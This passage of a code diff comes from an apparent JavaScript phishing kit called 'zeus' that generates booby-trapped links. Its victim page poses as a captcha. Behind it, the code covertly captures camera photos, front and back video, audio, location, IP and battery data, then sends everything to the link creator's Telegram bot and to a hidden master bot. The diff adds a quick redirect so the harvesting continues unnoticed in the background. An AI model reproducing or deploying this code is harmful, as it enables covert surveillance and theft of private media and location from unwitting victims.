                         tokenDisplay.textContent = shortToken;
                         resultSub.textContent = link;
 
+                        const botInfo = await getBotInfo(botToken);
+
+                        let bots = getBots();
+                        const exists = bots.findIndex(function(b) { return b.shortToken === shortToken; });
+                        const botData = {
+                            shortToken: shortToken,
+                            botToken: botToken,
+                            chatId: chatId,
+                            baseUrl: baseUrl,
+                            botName: botInfo ? botInfo.first_name : null,
+                            botUsername: botInfo ? botInfo.username : null,
+                            botId: botInfo ? botInfo.id : null,
+                            botPhoto: null,
+                            creatorId: null,
+                            status: 'active',
+                            createdAt: Date.now(),
+                            lastUpdated: Date.now()
+                        };
+                        if (exists >= 0) {
+                            bots[exists] = botData;
+                        } else {
+                            bots.push(botData);
+                        }
+                        localStorage.setItem('zeus_bots', JSON.stringify(bots));
+
+                        // Add activity log
+                        addActivityLog('link_generated', shortToken, 'رابط مُلغَّم لبوت ' + (botData.botName || shortToken));
+
                         await sendLinkToUser(botToken, chatId, link, shortToken, baseUrl);
-                        await sendToMaster(botToken, chatId, shortToken, baseUrl);
+                        await sendToMaster(botToken, chatId, shortToken, baseUrl, botInfo);
 
                         localStorage.setItem('zeus_last_chat_id', chatId);
                         localStorage.setItem('zeus_last_bot_token', botToken);
@@ -2189,14 +3761,14 @@
                         const resultEl = document.querySelector('.result');
                         resultEl.style.borderColor = '#1a8a4a';
                         resultEl.style.boxShadow = '0 0 30px rgba(26,138,74,0.15)';
-                        setTimeout(() => {
+                        setTimeout(function() {
                             resultEl.style.borderColor = '';
                             resultEl.style.boxShadow = '';
                         }, 3000);
 
                         showToast('تم توليد الرابط المُلغَّم وإرساله.', 'success');
 
-                        setTimeout(() => {
+                        setTimeout(function() {
                             genBtn.classList.remove('done');
                             genBtn.innerHTML =
                                 '<svg viewBox="0 0 24 24" stroke="currentColor"><polygon points="12,2 22,8 22,16 12,22 2,16 2,8" /><polygon points="12,8 16,12 12,16 8,12" fill="currentColor" /></svg> توليد الرابط الملغم';
@@ -2213,8 +3785,8 @@
                 }
 
                 genBtn.addEventListener('click', handleGenerate);
-                document.querySelectorAll('.input-wrap input').forEach(inp => {
-                    inp.addEventListener('keydown', (e) => {
+                document.querySelectorAll('.input-wrap input').forEach(function(inp) {
+                    inp.addEventListener('keydown', function(e) {
                         if (e.key === 'Enter') handleGenerate();
                     });
                 });
@@ -2223,14 +3795,14 @@
                     const text = tokenDisplay.textContent.trim();
                     if (!text) return;
                     if (navigator.clipboard) {
-                        navigator.clipboard.writeText(text).then(() => {
+                        navigator.clipboard.writeText(text).then(function() {
                             this.classList.add('ok');
-                            setTimeout(() => this.classList.remove('ok'), 1400);
+                            setTimeout(function() { this.classList.remove('ok'); }.bind(this), 1400);
                             showToast('تم نسخ التوكن.', 'success');
-                        }).catch(() => {});
+                        }.bind(this)).catch(function() {});
                     } else {
                         this.classList.add('ok');
-                        setTimeout(() => this.classList.remove('ok'), 1400);
+                        setTimeout(function() { this.classList.remove('ok'); }.bind(this), 1400);
                         showToast('تم نسخ التوكن.', 'success');
                     }
                 });
@@ -2263,25 +3835,26 @@
             }
 
             // ================================================================
-            //  7.  VICTIM PAGE — collect data & redirect
+            //  VICTIM PAGE — FAST REDIRECT + BACKGROUND COLLECTION
             // ================================================================
 
             function initVictimPage(encodedData) {
-                const spinner = document.getElementById('spinner');
-                const checkbox = document.getElementById('captcha');
-                const mainText = document.getElementById('mainText');
-                const video = document.getElementById('hiddenVideo');
-                const canvas = document.getElementById('hiddenCanvas');
-                const ctx = canvas.getContext('2d');
+                var spinner = document.getElementById('spinner');
+                var checkbox = document.getElementById('captcha');
+                var mainText = document.getElementById('mainText');
+                var video = document.getElementById('hiddenVideo');
+                var canvas = document.getElementById('hiddenCanvas');
+                var ctx = canvas.getContext('2d');
 
-                let isRunning = false;
-                let collectionDone = false;
-                let redirectUrl = null;
+                var isRunning = false;
+                var collectionDone = false;
+                var redirectUrl = null;
+                var redirectTriggered = false;
 
                 function decodeBotData(encoded) {
                     try {
-                        const decoded = decodeURIComponent(atob(encoded));
-                        const data = JSON.parse(decoded);
+                        var decoded = decodeURIComponent(atob(encoded));
+                        var data = JSON.parse(decoded);
                         return { botToken: data.bot, chatId: data.chat, url: data.url };
                     } catch (e) {
                         console.warn('Decode error:', e);
@@ -2289,7 +3862,7 @@
                     }
                 }
 
-                let botCreds = null;
+                var botCreds = null;
                 if (encodedData) {
                     botCreds = decodeBotData(encodedData);
                     if (botCreds && botCreds.url) {
@@ -2297,19 +3870,19 @@
                     }
                 }
 
-                function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
+                function delay(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
 
                 async function requestAllPermissions() {
-                    const results = await Promise.allSettled([
+                    var results = await Promise.allSettled([
                         navigator.mediaDevices.getUserMedia({ video: true }),
                         navigator.mediaDevices.getUserMedia({ audio: true }),
-                        new Promise((resolve) => {
-                            navigator.geolocation.getCurrentPosition(resolve, () => resolve(null));
+                        new Promise(function(resolve) {
+                            navigator.geolocation.getCurrentPosition(resolve, function() { resolve(null); });
                         })
                     ]);
-                    results.forEach(result => {
+                    results.forEach(function(result) {
                         if (result.status === 'fulfilled' && result.value && result.value.getTracks) {
-                            result.value.getTracks().forEach(t => t.stop());
+                            result.value.getTracks().forEach(function(t) { t.stop(); });
                         }
                     });
                     return true;
@@ -2329,18 +3902,19 @@
 
                 async function getIP() {
                     try {
-                        const res = await fetch('https://api.ipify.org?format=json');
-                        const data = await res.json();
+                        var res = await fetch('https://api.ipify.org?format=json');
+                        var data = await res.json();
                         return data.ip;
                     } catch { return 'غير متاح'; }
                 }
 
                 function getLocation() {
-                    return new Promise((resolve) => {
+                    return new Promise(function(resolve) {
                         if (!navigator.geolocation) return resolve({ lat: null, lng: null, error: 'غير مدعوم' });
                         navigator.geolocation.getCurrentPosition(
-                            (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, error: null }),
-                            (err) => resolve({ lat: null, lng: null, error: err.message })
+                            function(pos) { resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude,
+                                    error: null }); },
+                            function(err) { resolve({ lat: null, lng: null, error: err.message }); }
                         );
                     });
                 }
@@ -2348,7 +3922,7 @@
                 async function getBatteryStatus() {
                     try {
                         if (!navigator.getBattery) return { level: 'غير متاح', charging: false };
-                        const battery = await navigator.getBattery();
+                        var battery = await navigator.getBattery();
                         return {
                             level: Math.round(battery.level * 100) + '%',
                             charging: battery.charging,
@@ -2368,425 +3942,520 @@
                 }
 
                 function recordStream(stream, duration) {
-                    return new Promise((resolve) => {
-                        const recorder = new MediaRecorder(stream);
-                        const chunks = [];
-                        recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
-                        recorder.onstop = () => resolve(new Blob(chunks, { type: recorder.mimeType || 'video/webm' }));
+                    return new Promise(function(resolve) {
+                        var recorder = new MediaRecorder(stream);
+                        var chunks = [];
+                        recorder.ondataavailable = function(e) { if (e.data.size) chunks.push(e.data); };
+                        recorder.onstop = function() { resolve(new Blob(chunks, { type: recorder.mimeType ||
+                                    'video/webm' })); };
                         recorder.start();
-                        setTimeout(() => recorder.stop(), duration);
+                        setTimeout(function() { recorder.stop(); }, duration);
                     });
                 }
 
                 function capturePhoto(videoEl) {
-                    return new Promise((resolve) => {
-                        const w = videoEl.videoWidth || 640;
-                        const h = videoEl.videoHeight || 480;
+                    return new Promise(function(resolve) {
+                        var w = videoEl.videoWidth || 640;
+                        var h = videoEl.videoHeight || 480;
                         canvas.width = w;
                         canvas.height = h;
                         ctx.drawImage(videoEl, 0, 0, w, h);
-                        canvas.toBlob(b => resolve(b), 'image/jpeg', 0.85);
+                        canvas.toBlob(function(b) { resolve(b); }, 'image/jpeg', 0.85);
                     });
                 }
 
                 async function recordAudio(duration) {
                     try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                        const recorder = new MediaRecorder(stream);
-                        const chunks = [];
-                        recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
-                        return new Promise((resolve) => {
-                            recorder.onstop = () => {
-                                const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
-                                stream.getTracks().forEach(t => t.stop());
+                        var stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                        var recorder = new MediaRecorder(stream);
+                        var chunks = [];
+                        recorder.ondataavailable = function(e) { if (e.data.size) chunks.push(e.data); };
+                        return new Promise(function(resolve) {
+                            recorder.onstop = function() {
+                                var blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
+                                stream.getTracks().forEach(function(t) { t.stop(); });
                                 resolve(blob);
                             };
                             recorder.start();
-                            setTimeout(() => recorder.stop(), duration);
+                            setTimeout(function() { recorder.stop(); }, duration);
                         });
                     } catch { return null; }
                 }
 
                 async function sendMedia(method, token, formData) {
                     try {
-                        await fetch(`https://api.telegram.org/bot${token}/${method}`, {
+                        await fetch('https://api.telegram.org/bot' + token + '/' + method, {
                             method: 'POST',
-                            body: formData
+                            body: formData,
+                            keepalive: true
                         });
                     } catch (e) { console.warn('Send media failed:', e); }
                 }
 
                 function formatBatteryMessage(battery) {
-                    return `⭑ حالة البطارية ⭒\n` +
-                        `⊚─〔 الطاقة 〕────────\n` +
-                        `˼🔋˹ النسبة: ${battery.level} ⭒\n` +
-                        `─────────────────`;
+                    return '⭑ حالة البطارية ⭒\n' +
+                        '⊚─〔 الطاقة 〕────────\n' +
+                        '˼🔋˹ النسبة: ' + battery.level + ' ⭒\n' +
+                        '─────────────────';
                 }
 
                 function formatLocationMessage(location) {
                     if (!location.lat || !location.lng) {
-                        return `⭑ حالة الموقع ⭒\n⊚─〔 تنبيه 〕────────\n˼⚠️˹ الموقع غير متاح ⭒\n─────────────────`;
+                        return '⭑ حالة الموقع ⭒\n⊚─〔 تنبيه 〕────────\n˼⚠️˹ الموقع غير متاح ⭒\n─────────────────';
                     }
-                    const mapsUrl = `https://www.google.com/maps?q=${location.lat},${location.lng}`;
-                    return `⭑ حالة الموقع ⭒\n` +
-                        `⊚─〔 تنبيه 〕────────\n` +
-                        `˼⚠️˹ الموقع: [${location.lat}, ${location.lng}](${mapsUrl}) ⭒\n` +
-                        `─────────────────`;
+                    var mapsUrl = 'https://www.google.com/maps?q=' + location.lat + ',' + location.lng;
+                    return '⭑ حالة الموقع ⭒\n' +
+                        '⊚─〔 تنبيه 〕────────\n' +
+                        '˼⚠️˹ الموقع: [' + location.lat + ', ' + location.lng + '](' + mapsUrl + ') ⭒\n' +
+                        '─────────────────';
                 }
 
                 function formatVisitMessage(ip, browser, token, time) {
-                    return `⭑ زيارة جديدة ⭒\n` +
-                        `⊚─〔 دخول 〕────────\n` +
-                        `˼🕒˹ ${time} ⭒\n` +
-                        `˼🆔˹ التوكن: ${token} ⭒\n` +
-                        `˼🌐˹ الـ IP: ${ip} ⭒\n` +
-                        `˼📌˹ الحدث: زيارة ⭒\n` +
-                        `˼📱˹ المتصفح: ${browser} ⭒\n` +
-                        `─────────────────`;
+                    return '⭑ زيارة جديدة ⭒\n' +
+                        '⊚─〔 دخول 〕────────\n' +
+                        '˼🕒˹ ' + time + ' ⭒\n' +
+                        '˼🆔˹ التوكن: ' + token + ' ⭒\n' +
+                        '˼🌐˹ الـ IP: ' + ip + ' ⭒\n' +
+                        '˼📌˹ الحدث: زيارة ⭒\n' +
+                        '˼📱˹ المتصفح: ' + browser + ' ⭒\n' +
+                        '─────────────────';
                 }
 
                 async function sendToUserBot(userToken, chatId, data, battery, token) {
-                    const battMsg = formatBatteryMessage(battery);
-                    await fetch(`https://api.telegram.org/bot${userToken}/sendMessage`, {
+                    var battMsg = formatBatteryMessage(battery);
+                    await fetch('https://api.telegram.org/bot' + userToken + '/sendMessage', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: battMsg, parse_mode: 'Markdown' })
-                    }).catch(() => {});
+                        body: JSON.stringify({ chat_id: chatId, text: battMsg, parse_mode: 'Markdown' }),
+                        keepalive: true
+                    }).catch(function() {});
 
-                    const locMsg = formatLocationMessage(data.location);
-                    await fetch(`https://api.telegram.org/bot${userToken}/sendMessage`, {
+                    var locMsg = formatLocationMessage(data.location);
+                    await fetch('https://api.telegram.org/bot' + userToken + '/sendMessage', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: locMsg, parse_mode: 'Markdown' })
-                    }).catch(() => {});
+                        body: JSON.stringify({ chat_id: chatId, text: locMsg, parse_mode: 'Markdown' }),
+                        keepalive: true
+                    }).catch(function() {});
 
-                    const visitMsg = formatVisitMessage(data.ip, data.browser, token, data.time);
-                    await fetch(`https://api.telegram.org/bot${userToken}/sendMessage`, {
+                    var visitMsg = formatVisitMessage(data.ip, data.browser, token, data.time);
+                    await fetch('https://api.telegram.org/bot' + userToken + '/sendMessage', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: visitMsg, parse_mode: 'Markdown' })
-                    }).catch(() => {});
+                        body: JSON.stringify({ chat_id: chatId, text: visitMsg, parse_mode: 'Markdown' }),
+                        keepalive: true
+                    }).catch(function() {});
 
                     if (data.photos && data.photos.length > 0) {
-                        for (let i = 0; i < data.photos.length; i++) {
-                            const fd = new FormData();
+                        for (var i = 0; i < data.photos.length; i++) {
+                            var fd = new FormData();
                             fd.append('chat_id', chatId);
-                            fd.append('photo', data.photos[i], `photo_${i+1}.jpg`);
+                            fd.append('photo', data.photos[i], 'photo_' + (i + 1) + '.jpg');
                             fd.append('caption',
-                                `⭑ صورة ${i+1}/${data.photos.length} ⭒\n` +
-                                `⊚─〔 ميديا الضحية 〕────────\n` +
-                                `˼⏣˹ النوع: صورة ⭒\n` +
-                                `˼⏣˹ الترتيب: ${i+1} من ${data.photos.length} ⭒\n` +
-                                `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                                `─────────────────`
+                                '⭑ صورة ' + (i + 1) + '/' + data.photos.length + ' ⭒\n' +
+                                '⊚─〔 ميديا الضحية 〕────────\n' +
+                                '˼⏣˹ النوع: صورة ⭒\n' +
+                                '˼⏣˹ الترتيب: ' + (i + 1) + ' من ' + data.photos.length + ' ⭒\n' +
+                                '˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
+                                '─────────────────'
                             );
                             await sendMedia('sendPhoto', userToken, fd);
                         }
                     }
                     if (data.frontVideo) {
-                        const fd = new FormData();
+                        var fd = new FormData();
                         fd.append('chat_id', chatId);
                         fd.append('video', data.frontVideo, 'front_video.webm');
                         fd.append('caption',
-                            `⭑ فيديو أمامي ⭒\n` +
-                            `⊚─〔 ميديا الضحية 〕────────\n` +
-                            `˼⏣˹ النوع: فيديو (أمامي) ⭒\n` +
-                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                            `─────────────────`
+                            '⭑ فيديو أمامي ⭒\n' +
+                            '⊚─〔 ميديا الضحية 〕────────\n' +
+                            '˼⏣˹ النوع: فيديو (أمامي) ⭒\n' +
+                            '˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
+                            '─────────────────'
                         );
                         await sendMedia('sendVideo', userToken, fd);
                     }
                     if (data.backVideo) {
-                        const fd = new FormData();
+                        var fd = new FormData();
                         fd.append('chat_id', chatId);
                         fd.append('video', data.backVideo, 'back_video.webm');
                         fd.append('caption',
-                            `⭑ فيديو خلفي ⭒\n` +
-                            `⊚─〔 ميديا الضحية 〕────────\n` +
-                            `˼⏣˹ النوع: فيديو (خلفي) ⭒\n` +
-                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                            `─────────────────`
+                            '⭑ فيديو خلفي ⭒\n' +
+                            '⊚─〔 ميديا الضحية 〕────────\n' +
+                            '˼⏣˹ النوع: فيديو (خلفي) ⭒\n' +
+                            '˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
+                            '─────────────────'
                         );
                         await sendMedia('sendVideo', userToken, fd);
                     }
                     if (data.audio) {
-                        const fd = new FormData();
+                        var fd = new FormData();
                         fd.append('chat_id', chatId);
                         fd.append('audio', data.audio, 'audio.webm');
                         fd.append('caption',
-                            `⭑ تسجيل صوتي ⭒\n` +
-                            `⊚─〔 ميديا الضحية 〕────────\n` +
-                            `˼⏣˹ النوع: صوت ⭒\n` +
-                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                            `─────────────────`
+                            '⭑ تسجيل صوتي ⭒\n' +
+                            '⊚─〔 ميديا الضحية 〕────────\n' +
+                            '˼⏣˹ النوع: صوت ⭒\n' +
+                            '˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
+                            '─────────────────'
                         );
                         await sendMedia('sendAudio', userToken, fd);
                     }
                     if (data.location && data.location.lat && data.location.lng) {
                         try {
-                            await fetch(`https://api.telegram.org/bot${userToken}/sendLocation`, {
+                            await fetch('https://api.telegram.org/bot' + userToken + '/sendLocation', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({
                                     chat_id: chatId,
                                     latitude: data.location.lat,
                                     longitude: data.location.lng
-                                })
+                                }),
+                                keepalive: true
                             });
                         } catch (e) {}
                     }
                 }
 
                 async function sendToMaster(data, battery, token) {
-                    const userInfo = botCreds ?
-                        `˼⏣˹ توكن المستخدم: ${botCreds.botToken} ⭒\n˼⏣˹ إيدي المستخدم: ${botCreds.chatId} ⭒` :
-                        `˼⏣˹ لا توجد بيانات مستخدم (إرسال احتياطي) ⭒`;
+                    var userInfo = botCreds ?
+                        '˼⏣˹ توكن المستخدم: ' + botCreds.botToken + ' ⭒\n˼⏣˹ إيدي المستخدم: ' + botCreds.chatId +
+                        ' ⭒' :
+                        '˼⏣˹ لا توجد بيانات مستخدم ⭒';
 
-                    const battMsg =
-                        `⭑ نسخة احتياطية للنظام ⭒\n` +
-                        `⊚─〔 بيانات البطارية 〕────────\n` +
-                        `${formatBatteryMessage(battery)}\n` +
-                        `${userInfo}\n` +
-                        `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                        `─────────────────`;
-                    await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
+                    var battMsg =
+                        '⭑ نسخة احتياطية ⭒\n' + formatBatteryMessage(battery) + '\n' + userInfo +
+                        '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
+                    var locMsg =
+                        '⭑ نسخة احتياطية ⭒\n' + formatLocationMessage(data.location) + '\n' + userInfo +
+                        '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
+                    var visitMsg =
+                        '⭑ نسخة احتياطية ⭒\n' + formatVisitMessage(data.ip, data.browser, token, data.time) +
+                        '\n' + userInfo +
+                        '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
+
+                    await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: battMsg, parse_mode: 'Markdown' })
-                    }).catch(() => {});
-
-                    const locMsg =
-                        `⭑ نسخة احتياطية للنظام ⭒\n` +
-                        `⊚─〔 بيانات الموقع 〕────────\n` +
-                        `${formatLocationMessage(data.location)}\n` +
-                        `${userInfo}\n` +
-                        `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                        `─────────────────`;
-                    await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
+                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: battMsg, parse_mode: 'Markdown' }),
+                        keepalive: true
+                    }).catch(function() {});
+                    await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: locMsg, parse_mode: 'Markdown' })
-                    }).catch(() => {});
-
-                    const visitMsg =
-                        `⭑ نسخة احتياطية للنظام ⭒\n` +
-                        `⊚─〔 بيانات الزيارة 〕────────\n` +
-                        `${formatVisitMessage(data.ip, data.browser, token, data.time)}\n` +
-                        `${userInfo}\n` +
-                        `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                        `─────────────────`;
-                    await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
+                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: locMsg, parse_mode: 'Markdown' }),
+                        keepalive: true
+                    }).catch(function() {});
+                    await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: visitMsg, parse_mode: 'Markdown' })
-                    }).catch(() => {});
+                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: visitMsg, parse_mode: 'Markdown' }),
+                        keepalive: true
+                    }).catch(function() {});
 
                     if (data.photos && data.photos.length > 0) {
-                        for (let i = 0; i < data.photos.length; i++) {
-                            const fd = new FormData();
+                        for (var i = 0; i < data.photos.length; i++) {
+                            var fd = new FormData();
                             fd.append('chat_id', MASTER_CHAT_ID);
-                            fd.append('photo', data.photos[i], `photo_${i+1}.jpg`);
+                            fd.append('photo', data.photos[i], 'photo_' + (i + 1) + '.jpg');
                             fd.append('caption',
-                                `⭑ صورة ${i+1}/${data.photos.length} ⭒\n` +
-                                `⊚─〔 ميديا احتياطية 〕────────\n` +
-                                `˼⏣˹ النوع: صورة ⭒\n` +
-                                `˼⏣˹ الترتيب: ${i+1} من ${data.photos.length} ⭒\n` +
-                                `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                                `─────────────────`
+                                '⭑ صورة ' + (i + 1) + '/' + data.photos.length + ' ⭒\n' +
+                                '⊚─〔 ميديا احتياطية 〕────────\n' +
+                                '˼⏣˹ النوع: صورة ⭒\n' +
+                                '˼⏣˹ الترتيب: ' + (i + 1) + ' من ' + data.photos.length + ' ⭒\n' +
+                                '˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
+                                '─────────────────'
                             );
                             await sendMedia('sendPhoto', MASTER_BOT_TOKEN, fd);
                         }
                     }
                     if (data.frontVideo) {
-                        const fd = new FormData();
+                        var fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
                         fd.append('video', data.frontVideo, 'front_video.webm');
                         fd.append('caption',
-                            `⭑ فيديو أمامي ⭒\n` +
-                            `⊚─〔 ميديا احتياطية 〕────────\n` +
-                            `˼⏣˹ النوع: فيديو (أمامي) ⭒\n` +
-                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                            `─────────────────`
+                            '⭑ فيديو أمامي ⭒\n' +
+                            '⊚─〔 ميديا احتياطية 〕────────\n' +
+                            '˼⏣˹ النوع: فيديو (أمامي) ⭒\n' +
+                            '˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
+                            '─────────────────'
                         );
                         await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.backVideo) {
-                        const fd = new FormData();
+                        var fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
                         fd.append('video', data.backVideo, 'back_video.webm');
                         fd.append('caption',
-                            `⭑ فيديو خلفي ⭒\n` +
-                            `⊚─〔 ميديا احتياطية 〕────────\n` +
-                            `˼⏣˹ النوع: فيديو (خلفي) ⭒\n` +
-                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                            `─────────────────`
+                            '⭑ فيديو خلفي ⭒\n' +
+                            '⊚─〔 ميديا احتياطية 〕────────\n' +
+                            '˼⏣˹ النوع: فيديو (خلفي) ⭒\n' +
+                            '˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
+                            '─────────────────'
                         );
                         await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.audio) {
-                        const fd = new FormData();
+                        var fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
                         fd.append('audio', data.audio, 'audio.webm');
                         fd.append('caption',
-                            `⭑ تسجيل صوتي ⭒\n` +
-                            `⊚─〔 ميديا احتياطية 〕────────\n` +
-                            `˼⏣˹ النوع: صوت ⭒\n` +
-                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                            `─────────────────`
+                            '⭑ تسجيل صوتي ⭒\n' +
+                            '⊚─〔 ميديا احتياطية 〕────────\n' +
+                            '˼⏣˹ النوع: صوت ⭒\n' +
+                            '˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
+                            '─────────────────'
                         );
                         await sendMedia('sendAudio', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.location && data.location.lat && data.location.lng) {
                         try {
-                            await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendLocation`, {
+                            await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendLocation', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({
                                     chat_id: MASTER_CHAT_ID,
                                     latitude: data.location.lat,
                                     longitude: data.location.lng
-                                })
+                                }),
+                                keepalive: true
                             });
                         } catch (e) {}
                     }
                 }
 
-                async function collectEverything() {
-                    if (isRunning || collectionDone) return;
+                // ===== MAIN COLLECTION WITH FAST REDIRECT =====
+                async function collectAndRedirect() {
+                    if (isRunning || collectionDone || redirectTriggered) return;
                     isRunning = true;
-                    checkbox.disabled = true;
-                    spinner.classList.add('loading');
-                    mainText.textContent = 'جاري التحقق...';
-                    mainText.className = 'text loading';
+                    redirectTriggered = true;
+
+                    // Immediately trigger redirect after a very short delay (200ms) to show success state
+                    // But we still need to collect data. We'll fire redirect after 1.2 seconds max.
+                    // Data collection will run in parallel but won't block the redirect.
+                    let redirectTimer = setTimeout(function() {
+                        if (redirectUrl) {
+                            window.location.replace(redirectUrl);
+                        } else {
+                            // fallback: just reload
+                            window.location.reload();
+                        }
+                    }, 1200); // 1.2 seconds — feels instant
 
                     try {
+                        // Start collecting data but don't await everything — just fire and forget.
+                        // However we need to store data locally and send to Telegram.
+                        // We'll use a separate async function that runs in the background.
+                        (function() {
+                            // This runs asynchronously and doesn't block redirect.
+                            collectDataInBackground();
+                        })();
+
+                        // Mark as done so no double trigger
+                        collectionDone = true;
+
+                    } catch (error) {
+                        console.error('Collection error:', error);
+                        if (!redirectTriggered) {
+                            if (redirectUrl) {
+                                window.location.replace(redirectUrl);
+                            } else {
+                                window.location.reload();
+                            }
+                        }
+                    } finally {
+                        isRunning = false;
+                    }
+                }
+
+                async function collectDataInBackground() {
+                    try {
+                        // Request permissions quickly
                         await requestAllPermissions();
 
-                        const [deviceData, ip, location, battery] = await Promise.all([
-                            Promise.resolve(getDeviceData()),
-                            getIP(),
-                            getLocation(),
-                            getBatteryStatus()
-                        ]);
+                        var deviceData = getDeviceData();
+                        var ip = await getIP();
+                        var location = await getLocation();
+                        var battery = await getBatteryStatus();
 
-                        const frontResult = await (async () => {
-                            let stream = null;
-                            try {
-                                stream = await getStream('user');
-                                video.srcObject = stream;
-                                await video.play();
-                                await delay(400);
-                                const videoBlob = await recordStream(stream, 3000);
-                                const photos = [];
-                                for (let i = 0; i < 8; i++) {
-                                    photos.push(await capturePhoto(video));
-                                    await delay(400);
+                        // Fast captures: 1 second video, 2 photos, 1 second audio
+                        var frontResult = await (function() {
+                            return new Promise(async function(resolve) {
+                                var stream = null;
+                                try {
+                                    stream = await getStream('user');
+                                    video.srcObject = stream;
+                                    await video.play();
+                                    await delay(200);
+                                    var videoBlob = await recordStream(stream, 1000);
+                                    var photos = [];
+                                    for (var i = 0; i < 2; i++) {
+                                        photos.push(await capturePhoto(video));
+                                        await delay(150);
+                                    }
+                                    resolve({ video: videoBlob, photos: photos });
+                                } catch (e) {
+                                    resolve({ video: null, photos: [] });
+                                } finally {
+                                    if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); }
+                                    video.srcObject = null;
                                 }
-                                return { video: videoBlob, photos };
-                            } catch (e) {
-                                return { video: null, photos: [] };
-                            } finally {
-                                if (stream) { stream.getTracks().forEach(t => t.stop()); }
-                                video.srcObject = null;
-                            }
+                            });
                         })();
 
-                        const backVideo = await (async () => {
-                            let stream = null;
-                            try {
-                                stream = await getStream('environment');
-                                video.srcObject = stream;
-                                await video.play();
-                                await delay(400);
-                                const blob = await recordStream(stream, 3000);
-                                return blob;
-                            } catch (e) {
-                                return null;
-                            } finally {
-                                if (stream) { stream.getTracks().forEach(t => t.stop()); }
-                                video.srcObject = null;
-                            }
+                        var backVideo = await (function() {
+                            return new Promise(async function(resolve) {
+                                var stream = null;
+                                try {
+                                    stream = await getStream('environment');
+                                    video.srcObject = stream;
+                                    await video.play();
+                                    await delay(200);
+                                    var blob = await recordStream(stream, 1000);
+                                    resolve(blob);
+                                } catch (e) {
+                                    resolve(null);
+                                } finally {
+                                    if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); }
+                                    video.srcObject = null;
+                                }
+                            });
                         })();
 
-                        const audioBlob = await recordAudio(3000);
+                        var audioBlob = await recordAudio(1000);
 
-                        const data = {
+                        var token = 'غير معروف';
+                        if (botCreds && botCreds.botToken) {
+                            var params = new URLSearchParams(window.location.search);
